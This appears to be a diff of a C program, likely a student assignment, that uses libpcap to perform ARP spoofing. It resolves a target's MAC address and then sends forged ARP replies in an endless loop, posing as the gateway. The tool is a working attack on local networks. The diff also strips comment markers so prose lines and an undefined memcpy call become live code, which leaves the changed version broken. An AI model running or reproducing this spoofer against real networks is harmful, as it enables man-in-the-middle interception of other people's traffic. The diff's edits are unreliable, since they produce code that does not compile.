@@ -12,13 +12,13 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <ifaddrs.h>
-///////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////
 #define MAC_ADDR_LEN 6
 #define IP_ADDR_LEN 4
 
 #define BROADCAST 1
 #define UNKOWN_TARGET 2
-////////////////////////STRUCT DEF//////////////////////////
+////////////////////STRUCT DEF//////////////////////////
 typedef struct _ether_hdr
 {
 	uint8_t dmac[MAC_ADDR_LEN];
@@ -39,8 +39,8 @@ typedef struct _arp_hdr{
     uint8_t Target_Proto_addr[IP_ADDR_LEN];
 
 } arp_hdr;
-////////////////////////////////////////////////////////////
-// IP string includes dot(".") so, remove dot and convert to 1byte array
+////////////////////////////////////////////////////////
+IP string includes dot(".") so, remove dot and convert to 1byte array
 void convert_str_to_ipaddr(char *ip_str, uint8_t *ip)
 {
     for(int i=0; i<4;i++)
@@ -55,9 +55,9 @@ void convert_str_to_ipaddr(char *ip_str, uint8_t *ip)
         } while(ip_str++);
     }
 }
-/////////////////////////////////////////////////////////////
-// get my MAC address from network interface device name
-// using IFREQ
+/////////////////////////////////////////////////////////
+get my MAC address from network interface device name
+using IFREQ
 void get_my_mac_addr(char *dev_name, uint8_t *mac)
 {
     struct ifreq s;
@@ -68,12 +68,12 @@ void get_my_mac_addr(char *dev_name, uint8_t *mac)
     {
         for(int i = 0;i<MAC_ADDR_LEN; i++)
             mac[i] = s.ifr_addr.sa_data[i];
-        //memcpy(des, s.ifr_name.sa_data, MAC_ADDR_LEN);
+        memcpy(des, s.ifr_name.sa_data, MAC_ADDR_LEN);
     }
 }
-///////////////////////////////////////////////////////////////
-// get my IP address from network interface device name
-// using IFREQ
+///////////////////////////////////////////////////////////
+get my IP address from network interface device name
+using IFREQ
 void get_my_ip_addr(char *dev_name, uint8_t *ip)
 {
     struct ifreq s;
@@ -89,9 +89,9 @@ void get_my_ip_addr(char *dev_name, uint8_t *ip)
     convert_str_to_ipaddr(ipaddr, ip);
 }
 
-//////////////////////////////////////////////////////////////
-// set pointer of MAC address => ff:ff:ff:ff:ff:ff (type = BROADCAST)
-// set pointer of MAC address => 00:00:00:00:00:00 (type = UNKOWN_TARGET)
+//////////////////////////////////////////////////////////
+set pointer of MAC address => ff:ff:ff:ff:ff:ff (type = BROADCAST)
+set pointer of MAC address => 00:00:00:00:00:00 (type = UNKOWN_TARGET)
 void set_cast(uint8_t *mac,int type)
 {
     if (type == BROADCAST)
@@ -101,17 +101,17 @@ void set_cast(uint8_t *mac,int type)
         for(int i=0; i<MAC_ADDR_LEN; i++)
             mac[i] = 0x00;
 }
-//////////////////////////////////////////////////////////////
-// print mac address by pointer of MAC address
+//////////////////////////////////////////////////////////
+print mac address by pointer of MAC address
 void print_mac(uint8_t *mac_addr)
 {
 			printf("%.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
 			 mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
 }
-///////////////////////////////////////////////////////////////
-// get two pointers of ip address
-// return 0 : if two ip addresses are different
-// return 1 : if two ip addresses are same
+///////////////////////////////////////////////////////////
+get two pointers of ip address
+return 0 : if two ip addresses are different
+return 1 : if two ip addresses are same
 int ip_check(uint8_t *des, uint8_t *src)
 {
     for(int i=0; i<IP_ADDR_LEN; i++)
@@ -120,14 +120,14 @@ int ip_check(uint8_t *des, uint8_t *src)
     
     return 1;
 }
-////////////////////////////////////////////////////////////////
-// If you want to assign MAC address same as given MAC
+////////////////////////////////////////////////////////////
+If you want to assign MAC address same as given MAC
 void mac_assign(uint8_t *des, uint8_t *src)
 {
     for(int i=0; i<MAC_ADDR_LEN; i++)
         des[i] = src[i];
 }
-/////////////////////////////MAIN///////////////////////////////
+/////////////////////////MAIN///////////////////////////////
 int main(int argc, char *argv[])
 {
     if(argc != 4)
@@ -141,32 +141,32 @@ int main(int argc, char *argv[])
     char *gateway_ip = argv[3];
 	char errbuf[PCAP_ERRBUF_SIZE];
 
-// network interface handle open
+network interface handle open
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
 	}
 
-    // send spoofed arp packet to sender ip
-    // I need to know about sender's mac addr
-    // I must edit sender ip's 
+    //send spoofed arp packet to sender ip
+    //I need to know about sender's mac addr
+    //I must edit sender ip's 
     const u_char packet[60] = {0,}; 
 
-// to get victim's MAC addr, send to ARP request
+//to get victim's MAC addr, send to ARP request
 
-/////////////////////////SET ETHERNET HEADER////////////////////////
+/////////////////////SET ETHERNET HEADER////////////////////////
     ether_hdr *eth_h = (ether_hdr *)packet;
 
     get_my_mac_addr(dev, eth_h->smac);
     set_cast(eth_h->dmac,BROADCAST);
     eth_h->type = htons(ETHERTYPE_ARP);        //network layer protocol set ARP
     
-//////////////////////////SET ARP HEADER//////////////////////////
+//////////////////////SET ARP HEADER//////////////////////////
     arp_hdr *arp_h = (arp_hdr *)(packet + sizeof(ether_hdr));
     
-    arp_h->HW_type = htons(ARPHRD_ETHER);                     //ethernet(MAC) = network link protocol type
-    arp_h->Proto_type = htons(ETHERTYPE_IP);               //ipv4(It means.. network protocol for ARP media is ipv4)
+    arp_h->HW_type = htons(ARPHRD_ETHER);            //ethernet(MAC) = network link protocol type
+    arp_h->Proto_type = htons(ETHERTYPE_IP);         //ipv4(It means.. network protocol for ARP media is ipv4)
     arp_h->HW_addr_len = MAC_ADDR_LEN;               //I set HW Type = MAC so, set HW_addr_len = 6
     arp_h->Proto_addr_len = IP_ADDR_LEN;             //I set NETWORK Type = IPV4 so, set Proto_addr_len = 4
     arp_h->opcode = htons(ARPOP_REQUEST);            //ARP Request
@@ -189,13 +189,13 @@ int main(int argc, char *argv[])
         arp_hdr *arp_reply_arp_h = (arp_hdr *)(arp_reply_packet + sizeof(ether_hdr)); 
 
         struct pcap_pkthdr* header;
-		const u_char* receive_packet;
+        const u_char* receive_packet;
 
-		int res = pcap_next_ex(handle, &header, &receive_packet);
-		if (res == 0) 					//none be captured ( timeout )
-			continue;
-		if (res == -1 || res == -2)		//pcap_next_ex error
-		 	break;
+        int res = pcap_next_ex(handle, &header, &receive_packet);
+        if (res == 0) 					//none be captured ( timeout )
+            continue;
+        if (res == -1 || res == -2)		//pcap_next_ex error
+            break;
 
 		ether_hdr *receive_eth_h = (ether_hdr *)receive_packet;
         if(ntohs(receive_eth_h->type) == ETHERTYPE_ARP)
@@ -222,11 +222,11 @@ int main(int argc, char *argv[])
         sleep(10);  //if arp reply is not captured, sleep 10 sec and re-send packet
     }
 
-    //arp spoofing
+    arp spoofing
     while(1)
     {
         convert_str_to_ipaddr(gateway_ip, arp_h->Sender_Proto_addr);   //arp sender protocol address=>gateway ip addr
-        arp_h->opcode = htons(ARPOP_REPLY);                        //ARP REPLY
+        arp_h->opcode = htons(ARPOP_REPLY);                            //ARP REPLY
 
         if(pcap_sendpacket(handle, packet, 60) == PCAP_ERROR)
         {
